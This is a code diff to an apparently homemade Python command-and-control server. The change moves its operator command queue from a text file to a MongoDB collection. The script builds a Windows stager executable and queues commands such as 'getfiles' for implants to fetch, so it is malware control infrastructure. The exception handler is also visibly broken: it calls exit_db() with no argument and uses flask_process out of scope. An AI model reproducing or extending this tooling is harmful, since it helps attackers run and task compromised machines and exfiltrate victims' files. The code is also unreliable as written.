@@ -4,7 +4,7 @@ import shutil
 import pdb
 import argparse
 from flask import Flask,request
-
+import pymongo
 
 
 def generate_stager():
@@ -18,6 +18,33 @@ def generate_stager():
     subprocess.call('cp stager.py tmp',shell=True)
     subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
 
+def init_db(myclient):
+
+    dblist = myclient.list_database_names()
+    if "pythonc2" not in dblist:
+        print("Creating database")
+        mydb = myclient["pythonc2"]
+
+    mydb = myclient["pythonc2"]
+    collections = mydb.list_collection_names()
+
+    if 'commands' not in collections:
+        mycol = mydb["commands"]
+        h = {'sample':'To initialize db'}
+        mycol.insert_one(h)
+
+def exit_db(myclient):  
+    mydb = myclient["pythonc2"]
+    mycol = mydb["commands"]
+
+    mycol.drop()
+
+def insert_cmd_db(myclient,cmd):
+    mydb = myclient["pythonc2"]
+    mycol = mydb["commands"]
+    h = {'command':cmd}
+    mycol.insert_one(h)
+
 
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
@@ -29,8 +56,9 @@ def parser():
 def kill_listeners(flask_process):
     os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)
 
-def main():
+def main(myclient):
     args = parser()
+    init_db(myclient)
     if args.generate:
         ## Import stager code and convert to exe
         generate_stager()
@@ -63,17 +91,19 @@ def main():
             generate_stager()
             print("exe dumped to ./tmp")
         if cmd == 'getfiles':
-            f = open('commands.txt','w+')
-            print('getfiles',file=f)
-            f.close()
+            insert_cmd_db(myclient,cmd)
         if cmd == 'exit':
-            kill_listeners(flask_process)
+            if 'flask_process' in locals():
+                kill_listeners(flask_process)
+            exit_db(myclient)
             break
 
     
 
 if __name__=="__main__":
+    myclient = pymongo.MongoClient("mongodb://localhost:27017/")
     try:
-        main()
+        main(myclient)
     except KeyboardInterrupt:
         kill_listeners(flask_process)
+        exit_db()
